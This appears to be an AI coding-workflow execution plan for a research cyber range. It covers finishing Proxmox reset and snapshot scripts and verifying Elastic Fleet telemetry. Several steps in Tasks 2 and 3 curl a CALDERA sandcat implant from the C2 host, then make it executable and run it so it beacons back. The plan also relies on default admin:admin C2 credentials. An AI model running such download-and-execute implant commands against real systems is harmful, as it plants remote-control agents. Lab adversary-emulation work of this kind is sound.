---
phase: 03-full-telemetry-reset
plan: 04
type: execute
wave: 3
depends_on:
  - 03-03
files_modified:
  - scripts/proxmox/reset_range.sh
  - scripts/proxmox/take-snapshot.sh
  - scripts/elastic/verify-phase3.sh
autonomous: false
requirements:
  - RESET-01
  - RESET-02
  - RESET-03

must_haves:
  truths:
    - "clean_state snapshot exists on all 6 target VMIDs (201, 202, 301, 401, 402, 601) — NOT on elastic-vm or caldera-vm"
    - "reset_range.sh runs end-to-end and completes in < 5 minutes wall-clock"
    - "After reset: all 6 Fleet agents return to Healthy within the 5-minute window"
    - "After reset: AD domain authentication succeeds (lab.local) — no USN rollback"
    - "Kali reaches TARGET subnet (10.10.10.10) after reset"
    - "CALDERA sandcat binary phones home to caldera-vm:8888 on a test run from Kali"
    - "sandcat binary is REMOVED from Kali before clean_state snapshot is taken (Pitfall 7)"
    - "verify-phase3.sh runs from elastic-vm and checks all 5 ROADMAP Phase 3 success criteria"
  artifacts:
    - path: "scripts/proxmox/reset_range.sh"
      provides: "Completed parallel SSH fan-out reset script (no more placeholder VMIDs)"
      contains: "ssh root@host2"
    - path: "scripts/proxmox/take-snapshot.sh"
      provides: "One-shot simultaneous clean_state snapshot across all 6 target VMs"
      contains: "clean_state"
    - path: "scripts/elastic/verify-phase3.sh"
      provides: "End-to-end phase verification covering all 5 ROADMAP success criteria"
      contains: "ROADMAP SC-5"
  key_links:
    - from: "scripts/proxmox/reset_range.sh"
      to: "Proxmox hosts host2/host3/host4/host6"
      via: "SSH fan-out with & parallel"
      pattern: "ssh root@host2.*& ssh root@host3"
    - from: "scripts/proxmox/take-snapshot.sh"
      to: "VMIDs 201, 202, 301, 401, 402, 601"
      via: "SSH fan-out to each host + qm snapshot"
      pattern: "qm snapshot.*clean_state"
    - from: "scripts/elastic/verify-phase3.sh"
      to: "Fleet API (https://10.0.0.10:5601/api/fleet/agents)"
      via: "curl with kbn-xsrf header"
      pattern: "api/fleet/agents"
---

<objective>
Complete the reset mechanism and validate all Phase 3 success criteria end-to-end.

Three tracks:
1. Complete reset_range.sh — populate real VMIDs, implement SSH fan-out to hosts 2/3/4/6
2. Create take-snapshot.sh — simultaneous clean_state snapshot on all 6 target VMs after Healthy
3. Create verify-phase3.sh — automated end-to-end verification of all 5 ROADMAP success criteria

Then run the validation sequence:
  (a) Run take-snapshot.sh to capture the clean baseline
  (b) Run reset_range.sh as a full test; measure wall-clock time
  (c) Run CALDERA sandcat test (success criterion #5) — then remove binary before snapshot
  (d) Run verify-phase3.sh to produce [PASS/FAIL] for all 5 criteria

Purpose: This plan closes all three RESET requirements and provides the gating verification
for Phase 3 completion. The clean_state snapshot created here is the starting point for
every Phase 4-6 APT emulation run and ML baselining session.

Output:
- scripts/proxmox/reset_range.sh (COMPLETED — no more placeholder VMIDs)
- scripts/proxmox/take-snapshot.sh (new file)
- scripts/elastic/verify-phase3.sh (new file)
- clean_state snapshot on VMIDs 201, 202, 301, 401, 402, 601
- verify-phase3.sh output showing all 5 ROADMAP success criteria [PASS]
</objective>

<execution_context>
@$HOME/.claude/get-shit-done/workflows/execute-plan.md
@$HOME/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/ROADMAP.md
@.planning/STATE.md
@.planning/phases/03-full-telemetry-reset/03-CONTEXT.md
@.planning/phases/03-full-telemetry-reset/03-RESEARCH.md
@.planning/phases/03-full-telemetry-reset/03-03-SUMMARY.md

<interfaces>
<!-- Key patterns from existing code and RESEARCH.md -->

From scripts/proxmox/reset_range.sh (current scaffold):
- SNAP_NAME="clean_state" (already set correctly)
- EXCLUDED_IPS=("10.0.0.10" "10.0.0.20") — elastic-vm and caldera-vm guards (do NOT remove)
- RESET_VMS declare -A with placeholder VMIDs 0 — Task 1 populates these
- reset_vm() function: qm stop → qm rollback → qm start (exists, correct)
- Parallel execution with & and wait (exists, correct)
- The scaffold runs qm commands LOCALLY — must be changed to SSH fan-out per D-17

VMID-to-host mapping (from provision-windows.sh header + 03-CONTEXT.md D-17):
  Host 2: dc01=201, sql01=202
  Host 3: exchange01=301
  Host 4: ws01=401, ws02=402
  Host 6: kali=601

From 03-CONTEXT.md D-17 (reset fan-out pattern from RESEARCH.md Pattern 6):
  ssh root@host2 → qm stop 201; qm rollback 201 clean_state; qm start 201 &
                   qm stop 202; qm rollback 202 clean_state; qm start 202 &
                   wait
  ssh root@host3 → qm stop 301; qm rollback 301 clean_state; qm start 301
  ssh root@host4 → qm stop 401; qm rollback 401 clean_state; qm start 401 &
                   qm stop 402; qm rollback 402 clean_state; qm start 402 &
                   wait
  ssh root@host6 → qm stop 601; qm rollback 601 clean_state; qm start 601
  All four ssh branches run in parallel (& after each ssh call, final wait)

From 03-RESEARCH.md Pattern 4 (Fleet health poll — CORRECTED D-19):
  URL: https://10.0.0.10:5601/api/fleet/agents?kuery=status:online&perPage=50
  NOT port 9200 / NOT .fleet-agents/_search
  Header: -H "kbn-xsrf: true"
  Response field: .total (integer)
  Pass condition: .total >= 6
  Timeout: 300 seconds (5 minutes per RESET-03)

From 03-RESEARCH.md Pattern 7 (CALDERA sandcat test — CORRECTED port):
  Download: curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' \
    http://10.0.0.20:8888/file/download > /tmp/sandcat
  Run: chmod +x /tmp/sandcat && /tmp/sandcat -server http://10.0.0.20:8888 -group red -v
  Port: 8888 (HTTP beacon), NOT 8853 (DNS contact socket)
  Verify: CALDERA UI at http://10.0.0.20:8888 → Agents tab → shows kali agent

From 03-RESEARCH.md Pitfall 4 (simultaneous snapshot):
  qm snapshot --vmstate 0 (disk-only, fast)
  All 6 VMs snapshotted simultaneously via SSH fan-out (same & pattern as reset)
  Reason: sequential snapshots cause AD USN rollback on domain restore

From 03-RESEARCH.md Pitfall 7 (sandcat must NOT be in clean_state):
  take-snapshot.sh must pre-flight check: ssh kali@10.0.0.16 "test ! -f /tmp/sandcat"
  If /tmp/sandcat exists: exit 1 with message "Remove sandcat from Kali before snapshotting"

5 ROADMAP Phase 3 success criteria to verify (ROADMAP.md §Phase 3):
  SC-1: Fleet UI shows dc01, exchange01, sql01, ws01 Healthy + Elastic Defend DETECT mode
  SC-2: cmd.exe on dc01 → Kibana Discover process.name:"cmd.exe" returns Sysmon EID 1 with ECS fields
  SC-3: packetbeat-* index has DNS traffic from TARGET subnet (10.10.10.0/24)
  SC-4: reset_range.sh runs end-to-end in < 5 min + Fleet shows Healthy after
  SC-5: Kali reaches TARGET subnet and CALDERA sandcat beacons to caldera-vm:8888
</interfaces>
</context>

<tasks>

<task type="auto">
  <name>Task 1: Complete reset_range.sh — populate VMIDs + implement SSH fan-out</name>
  <files>scripts/proxmox/reset_range.sh</files>
  <read_first>
    - scripts/proxmox/reset_range.sh (full file — read the complete scaffold before modifying anything)
    - .planning/phases/03-full-telemetry-reset/03-CONTEXT.md (D-17: SSH fan-out from elastic-vm; D-18: runs from elastic-vm)
    - .planning/phases/03-full-telemetry-reset/03-RESEARCH.md (Pattern 6: SSH fan-out completion; Fleet health poll Pattern 4)
  </read_first>
  <action>
    Modify scripts/proxmox/reset_range.sh to complete the scaffold. Make MINIMAL changes:
    do not remove the D-10 exclusion guard, do not change SNAP_NAME, do not change log()/die()/warn().

    Change 1 — Populate RESET_VMS with real VMIDs (replace all 0 placeholders):
      "dc01"=201, "sql01"=202, "exchange01"=301, "ws01"=401, "ws02"=402, "kali"=601
      Remove all "TODO RESET-02" comments from the VMID lines once populated.

    Change 2 — Replace the local qm execution model with SSH fan-out functions.
    The existing reset_vm() function calls qm directly, which only works when running
    ON the Proxmox host. Since the script runs FROM elastic-vm (D-18), replace the
    main execution loop with four per-host SSH functions:

    Define four functions: reset_host2(), reset_host3(), reset_host4(), reset_host6()
    Each SSHes to the appropriate host and runs qm stop/rollback/start for its VMIDs.
    Within each function, use & and wait for VMs on the same host (parallel on same host):
      reset_host2(): ssh root@host2 executes "qm stop 201 && qm rollback 201 clean_state && qm start 201 & qm stop 202 && qm rollback 202 clean_state && qm start 202 & wait"
      reset_host3(): ssh root@host3 executes "qm stop 301 && qm rollback 301 clean_state && qm start 301"
      reset_host4(): ssh root@host4 executes "qm stop 401 && qm rollback 401 clean_state && qm start 401 & qm stop 402 && qm rollback 402 clean_state && qm start 402 & wait"
      reset_host6(): ssh root@host6 executes "qm stop 601 && qm rollback 601 clean_state && qm start 601"

    Call all four functions in parallel: reset_host2 & reset_host3 & reset_host4 & reset_host6 &
    Then: wait — captures all background pids.

    Change 3 — Replace the existing PIDS=() parallel loop with the SSH fan-out. The old loop
    called reset_vm() locally; that is now replaced by the four per-host SSH function calls.
    Keep the FAILED counter and warn/die pattern for SSH function failures.

    Change 4 — Add Fleet health poll AFTER all hosts complete (CORRECTED D-19 endpoint):
    After the wait, add poll_fleet_health() function using the Pattern 4 design from RESEARCH.md:
      Polls https://10.0.0.10:5601/api/fleet/agents?kuery=status:online&perPage=50
      Header: kbn-xsrf: true
      Auth: -u elastic:${ELASTIC_PW}
      Parse .total with jq
      EXPECTED_AGENTS=6, TIMEOUT=300, POLL_INTERVAL=10
      Exit 0 if all 6 online within 300 seconds; exit 1 (and call die()) if timeout

    Add ELASTIC_PW env var check at script top (after existing SNAP_NAME and EXCLUDED arrays).
    Exit 1 with message if ELASTIC_PW is unset.

    Update the Phase status comment at top of file from "SCAFFOLD" to "COMPLETE (Phase 3)".
    Keep all other comments intact.
  </action>
  <verify>
    <automated>grep -c 'ssh root@host2\|ssh root@host3\|ssh root@host4\|ssh root@host6' /home/researcher/Research/titulacion/scripts/proxmox/reset_range.sh</automated>
  </verify>
  <done>
    reset_range.sh contains ssh root@host2, host3, host4, host6; RESET_VMS has VMIDs 201/202/301/401/402/601 (no zeros); contains Fleet health poll at port 5601 with kbn-xsrf header; D-10 exclusion guard still present; ELASTIC_PW check present
  </done>
</task>

<task type="auto">
  <name>Task 2: Write take-snapshot.sh + verify-phase3.sh</name>
  <files>
    scripts/proxmox/take-snapshot.sh
    scripts/elastic/verify-phase3.sh
  </files>
  <read_first>
    - scripts/proxmox/reset_range.sh (just completed — use same SSH fan-out pattern, same log/die/warn helpers)
    - .planning/phases/03-full-telemetry-reset/03-CONTEXT.md (D-20: simultaneous snapshot, separate one-shot script, name "clean_state"; D-17: SSH fan-out pattern)
    - .planning/phases/03-full-telemetry-reset/03-RESEARCH.md (Pitfall 4: simultaneous snapshot required; Pitfall 7: sandcat pre-flight; Pattern 7: CALDERA sandcat test command; Pattern 4: Fleet health poll; Validation Architecture: 5 ROADMAP success criteria test map)
  </read_first>
  <action>
    CREATE scripts/proxmox/take-snapshot.sh:

    Script header:
    - "Run ONCE from elastic-vm after all 6 agents are Healthy in Fleet (plan 03-03 complete)"
    - "D-20: simultaneous snapshot across VMIDs 201, 202, 301, 401, 402, 601"
    - "elastic-vm (VMID: none) and caldera-vm are EXCLUDED (D-10)"
    - "Snapshot name: clean_state"
    - "WARNING: Do NOT run take-snapshot.sh with /tmp/sandcat present on Kali (Pitfall 7)"
    - "qm snapshot --vmstate 0 (disk-only, no RAM state) per RESEARCH.md recommendation"

    Required env vars: ELASTIC_PW (for Fleet health pre-check)

    Pre-flight check 1 — Verify all 6 agents Healthy in Fleet BEFORE snapshotting (RESET-01):
      Run Fleet health poll (same poll_fleet_health pattern) with EXPECTED_AGENTS=6, TIMEOUT=120s
      If not all 6 Healthy within 120s: exit 1 with die() message

    Pre-flight check 2 — Verify /tmp/sandcat absent on Kali (Pitfall 7):
      ssh kali@10.0.0.16 "test ! -f /tmp/sandcat" || die "FATAL: Remove /tmp/sandcat from Kali before snapshotting (Pitfall 7). Run: ssh kali@10.0.0.16 'rm -f /tmp/sandcat && rm -f /tmp/sandcat.go-linux'"

    Confirmation prompt: show all 6 VMIDs about to be snapshotted, require [y/N]

    Snapshot fan-out (4 SSH branches in parallel, same as reset_range.sh):
      snapshot_host2(): ssh root@host2 "qm snapshot 201 clean_state --vmstate 0 & qm snapshot 202 clean_state --vmstate 0 & wait"
      snapshot_host3(): ssh root@host3 "qm snapshot 301 clean_state --vmstate 0"
      snapshot_host4(): ssh root@host4 "qm snapshot 401 clean_state --vmstate 0 & qm snapshot 402 clean_state --vmstate 0 & wait"
      snapshot_host6(): ssh root@host6 "qm snapshot 601 clean_state --vmstate 0"
    Call all four in parallel: snapshot_host2 & snapshot_host3 & snapshot_host4 & snapshot_host6 &
    wait

    Verification after snapshot: for each host, run "qm listsnapshot <vmid>" and grep for "clean_state"
    Print [OK] <vm> clean_state confirmed or [FAIL] for each VM.

    ---

    CREATE scripts/elastic/verify-phase3.sh:

    Script header:
    - "Run from elastic-vm to verify all 5 Phase 3 ROADMAP success criteria"
    - "Usage: bash verify-phase3.sh"
    - "Requires: ELASTIC_PW env var"
    - "Requires: WINDOWS_ADMIN_PW env var (for WinRM to run cmd.exe on dc01 for SC-2)"
    - "Output: [PASS] or [FAIL] for each of the 5 success criteria"

    Required env vars: ELASTIC_PW, WINDOWS_ADMIN_PW — exit 1 if unset.

    SC-1 — Fleet shows dc01, exchange01, sql01, ws01 Healthy + Elastic Defend DETECT:
      curl -sk -u "elastic:${ELASTIC_PW}" -H "kbn-xsrf: true" \
        "https://10.0.0.10:5601/api/fleet/agents?kuery=status:online&perPage=50" | \
        jq '[.items[].local_metadata.host.name]'
      Check that dc01, exchange01, sql01, ws01 all appear in the online list
      Check Elastic Defend policy: curl Fleet API for windows-target policy and verify
        protection mode is "detect" not "prevent"
        (curl -sk -H "kbn-xsrf: true" -u "elastic:${ELASTIC_PW}" \
          "https://10.0.0.10:5601/api/fleet/agent_policies?full=true" | \
          jq '.items[] | select(.name=="windows-target") | .package_policies[] | select(.name | test("defend")) | .inputs[].config.policy.value.windows.malware.mode')
      Print [PASS] SC-1 or [FAIL] SC-1 with explanation

    SC-2 — cmd.exe on dc01 → Sysmon EID 1 with ECS process.name in Kibana:
      Run cmd.exe on dc01 via WinRM:
        pwsh -c "Invoke-Command -ComputerName 10.0.0.11 -Credential \$cred -ScriptBlock { Start-Process cmd.exe -ArgumentList '/c whoami' }"
      Sleep 15 seconds for Sysmon + Elastic Agent to ingest
      Query Elasticsearch for Sysmon EID 1 with process.name: cmd.exe:
        curl -sk -u "elastic:${ELASTIC_PW}" \
          "https://10.0.0.10:9200/logs-*/_count?q=process.name:cmd.exe+AND+event.code:1+AND+agent.name:dc01" | jq '.count'
      count > 0 → [PASS] SC-2; else [FAIL] SC-2

    SC-3 — packetbeat-* has DNS traffic from TARGET subnet:
      curl -sk -u "elastic:${ELASTIC_PW}" \
        "https://10.0.0.10:9200/packetbeat-*/_count?q=network.protocol:dns+AND+source.ip:10.10.10.*" | \
        jq '.count'
      count > 0 → [PASS] SC-3; else [FAIL] SC-3

    SC-4 — reset_range.sh completes in < 5 minutes + Fleet Healthy after:
      Record start time: START=$(date +%s)
      Run: bash scripts/proxmox/reset_range.sh (which includes its own Fleet health poll)
      Record end time: END=$(date +%s)
      ELAPSED=$((END - START))
      If exit code 0 AND ELAPSED < 300 → [PASS] SC-4 (print elapsed time)
      Else → [FAIL] SC-4 with elapsed time and failure reason

    SC-5 — Kali reaches TARGET subnet and CALDERA sandcat beacons to caldera-vm:8888:
      Test TARGET reachability:
        ssh kali@10.0.0.16 "ping -c 2 -W 3 10.10.10.10" && echo "TARGET_OK" || echo "TARGET_FAIL"
      Download and run sandcat (per RESEARCH.md Pattern 7 — port 8888, NOT 8853):
        ssh kali@10.0.0.16 "
          curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' \
            http://10.0.0.20:8888/file/download > /tmp/sandcat
          chmod +x /tmp/sandcat
          timeout 30 /tmp/sandcat -server http://10.0.0.20:8888 -group red -v &
          sleep 20
        "
      Poll CALDERA API for a new agent:
        curl -sk -u 'admin:admin' "http://10.0.0.20:8888/api/v2/agents" | \
          jq '[.[] | select(.host == "kali")] | length'
      count > 0 → [PASS] SC-5; else → [FAIL] SC-5 with note to check CALDERA UI manually

      After SC-5 check: clean up sandcat from Kali regardless of result:
        ssh kali@10.0.0.16 "rm -f /tmp/sandcat /tmp/sandcat.go-linux"
        echo "[CLEANUP] sandcat removed from Kali (STATE.md: agent binary NOT in clean_state)"

    Final summary: print count of PASS/FAIL, print "Phase 3 COMPLETE" if all 5 PASS,
    print "Phase 3 INCOMPLETE — see failures above" if any FAIL.

    Make both files executable.
  </action>
  <verify>
    <automated>grep -c 'SC-1\|SC-2\|SC-3\|SC-4\|SC-5' /home/researcher/Research/titulacion/scripts/elastic/verify-phase3.sh</automated>
  </verify>
  <done>
    take-snapshot.sh exists; contains "qm snapshot.*clean_state.*--vmstate 0"; contains sandcat pre-flight check; contains simultaneous SSH fan-out with &.
    verify-phase3.sh exists; contains SC-1 through SC-5; Fleet health poll uses port 5601 not 9200; sandcat test uses port 8888; sandcat cleanup present; is executable.
  </done>
</task>

<task type="checkpoint:human-verify">
  <name>Task 3: Run full Phase 3 validation sequence</name>
  <what-built>
    take-snapshot.sh and verify-phase3.sh written in Task 2; reset_range.sh completed in Task 1.
    This checkpoint runs the complete validation sequence to confirm Phase 3 success criteria.
    IMPORTANT: Run the CALDERA sandcat test (SC-5) BEFORE taking the clean_state snapshot,
    then clean up sandcat, THEN run take-snapshot.sh.
  </what-built>
  <how-to-verify>
    SEQUENCE (order matters — do not reorder):

    Step 1 — Confirm all 6 agents Healthy before proceeding:
      Open https://10.0.0.10:5601 → Fleet → Agents
      All 6 should show Healthy (if not, resolve per 03-03 before continuing)

    Step 2 — Run CALDERA sandcat test (SC-5) BEFORE taking snapshot:
      ssh kali@10.0.0.16
      curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' \
        http://10.0.0.20:8888/file/download > /tmp/sandcat
      chmod +x /tmp/sandcat
      /tmp/sandcat -server http://10.0.0.20:8888 -group red -v &
      (Wait 15-20 seconds)
      Verify: Open CALDERA UI at http://10.0.0.20:8888 → Agents tab
        Confirm: a Kali agent appears with hostname "kali" or similar
      After confirming: kill sandcat process on Kali and remove binary:
        pkill sandcat 2>/dev/null; rm -f /tmp/sandcat /tmp/sandcat.go-linux

    Step 3 — Take clean_state snapshot (all 6 VMs simultaneously):
      From elastic-vm:
      export ELASTIC_PW="<elastic password from PASSWORDS.md>"
      bash scripts/proxmox/take-snapshot.sh
      Expected output: [OK] for each of dc01, sql01, exchange01, ws01, ws02, kali

    Step 4 — Verify snapshots exist on all hosts:
      ssh root@host2 "qm listsnapshot 201 && qm listsnapshot 202"
      ssh root@host3 "qm listsnapshot 301"
      ssh root@host4 "qm listsnapshot 401 && qm listsnapshot 402"
      ssh root@host6 "qm listsnapshot 601"
      All must show "clean_state" in the output

    Step 5 — Run verify-phase3.sh (all 5 ROADMAP success criteria):
      export ELASTIC_PW="<elastic password>"
      export WINDOWS_ADMIN_PW="<Administrator password>"
      bash scripts/elastic/verify-phase3.sh 2>&1 | tee /tmp/verify-phase3.log

      SC-4 (reset_range.sh test) will run reset_range.sh internally — this will
      roll back all 6 VMs to clean_state and restart them. After the script completes,
      check that:
        a. All VMs came back up
        b. Fleet shows 6 agents Healthy again
        c. AD auth works: on dc01, run nltest /sc_verify:lab.local

    Step 6 — Review verify-phase3.sh output:
      cat /tmp/verify-phase3.log | grep -E 'PASS|FAIL|SC-'
      Expected: [PASS] SC-1 through [PASS] SC-5

    Step 7 — If any SC fails:
      SC-1 FAIL: Check Fleet UI; if Elastic Defend shows Prevent, edit policy in Fleet to DETECT, force re-enroll if needed
      SC-2 FAIL: Check Sysmon64 service on dc01; check Windows Event Log integration in Fleet policy
      SC-3 FAIL: Check packetbeat-* index in Kibana; check Npcap installed on Windows VMs (Pitfall 1)
      SC-4 FAIL: Check wall-clock time; if > 5 min, investigate which host is slow; check SSH fan-out timing
      SC-5 FAIL: Check CALDERA is running on caldera-vm (http://10.0.0.20:8888); check Kali TARGET NIC (ping 10.10.10.10)
  </how-to-verify>
  <resume-signal>Type "phase3-complete" when verify-phase3.sh shows [PASS] for all 5 success criteria and clean_state snapshots are confirmed on all 6 VMIDs. Paste the final summary line from verify-phase3.sh output.</resume-signal>
</task>

</tasks>

<threat_model>
## Trust Boundaries

| Boundary | Description |
|----------|-------------|
| elastic-vm → Proxmox hosts (SSH root) | Used for both reset and snapshot operations |
| elastic-vm → CALDERA API (http://10.0.0.20:8888) | Unauthenticated by default in CALDERA 5.x; MGMT-subnet only |
| clean_state snapshot (persistent) | Baseline trusted state — must not contain attacker artifacts |

## STRIDE Threat Register

| Threat ID | Category | Component | Disposition | Mitigation Plan |
|-----------|----------|-----------|-------------|-----------------|
| T-03-12 | Tampering | sandcat binary in clean_state snapshot | mitigate | take-snapshot.sh pre-flight: "test ! -f /tmp/sandcat" exits 1 before snapshotting (Pitfall 7) |
| T-03-13 | Tampering | elastic-vm or caldera-vm accidentally snapshotted | mitigate | take-snapshot.sh only SSHes to host2/3/4/6; elastic-vm and caldera-vm hosts are never targets; D-10 guard in reset_range.sh unchanged |
| T-03-14 | Denial of Service | Sequential snapshot timing causing AD USN rollback | mitigate | Simultaneous SSH fan-out with & ensures all 6 qm snapshot calls fire within milliseconds (Pitfall 4) |
| T-03-15 | Information Disclosure | ELASTIC_PW used in Fleet health poll URL | mitigate | Passed as env var; never hardcoded in script; curl -sk suppresses error output |
| T-03-SC | Tampering | No new pip/npm/cargo installs | accept | All tools are bash builtins or curl/jq/ssh already present on elastic-vm |
</threat_model>

<verification>
Final state verification from elastic-vm after Task 3 checkpoint:

1. Snapshots exist on all 6 VMIDs:
   ssh root@host2 "qm listsnapshot 201 | grep clean_state && qm listsnapshot 202 | grep clean_state"
   ssh root@host3 "qm listsnapshot 301 | grep clean_state"
   ssh root@host4 "qm listsnapshot 401 | grep clean_state && qm listsnapshot 402 | grep clean_state"
   ssh root@host6 "qm listsnapshot 601 | grep clean_state"
   Expected: each prints "clean_state" line

2. reset_range.sh syntax and content correct:
   grep -E 'ssh root@host2|ssh root@host3|ssh root@host4|ssh root@host6' scripts/proxmox/reset_range.sh | wc -l
   Expected: >= 4 lines

3. verify-phase3.sh has all 5 SCs and correct endpoints:
   grep -E 'SC-[1-5]|5601.*fleet/agents|8888' scripts/elastic/verify-phase3.sh | wc -l
   Expected: >= 7 matches

4. Fleet shows 6 agents Healthy after reset test:
   curl -sk -u "elastic:${ELASTIC_PW}" -H "kbn-xsrf: true" \
     "https://10.0.0.10:5601/api/fleet/agents?kuery=status:online&perPage=50" | jq '.total'
   Expected: 6

5. No sandcat on Kali:
   ssh kali@10.0.0.16 "test ! -f /tmp/sandcat && echo 'clean'"
   Expected: "clean"
</verification>

<success_criteria>
- reset_range.sh has no placeholder VMID 0 values; contains ssh root@host2/3/4/6 fan-out; Fleet health poll uses port 5601 with kbn-xsrf header
- take-snapshot.sh exists; performs simultaneous SSH fan-out to all 4 hosts; sandcat pre-flight check present; --vmstate 0 flag used
- verify-phase3.sh exists; covers SC-1 through SC-5; CALDERA test uses port 8888; Fleet poll uses port 5601; sandcat cleanup present
- qm listsnapshot confirms clean_state on VMIDs 201, 202, 301, 401, 402, 601 (not on elastic-vm or caldera-vm)
- bash scripts/elastic/verify-phase3.sh shows [PASS] for all 5 ROADMAP Phase 3 success criteria
- reset_range.sh completes in < 5 minutes wall-clock (SC-4)
- sandcat binary absent from Kali after Phase 3 validation (verify: ssh kali@10.0.0.16 "test ! -f /tmp/sandcat")
</success_criteria>

<output>
Create `.planning/phases/03-full-telemetry-reset/03-04-SUMMARY.md` when done.
Include verify-phase3.sh output (the 5 [PASS]/[FAIL] lines) in the SUMMARY under "Verification Results".
</output>
